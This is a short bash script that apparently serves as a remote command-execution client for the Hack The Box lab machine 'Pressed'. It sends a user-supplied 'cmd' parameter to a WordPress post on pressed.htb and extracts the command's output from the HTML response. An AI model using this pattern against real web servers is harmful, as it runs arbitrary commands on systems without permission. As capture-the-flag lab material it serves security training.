    #!/bin/bash
    
    curl -d "cmd=$1" -s 'http://pressed.htb/index.php/2022/01/28/hello-world/' |
            awk '/<\/table>/{flag=1;next}/<p><\/p>/{flag=0}flag' |
            sed 's/&#8211;/--/g' | sed 's/&#8212;/---/g' |
            head -n -3
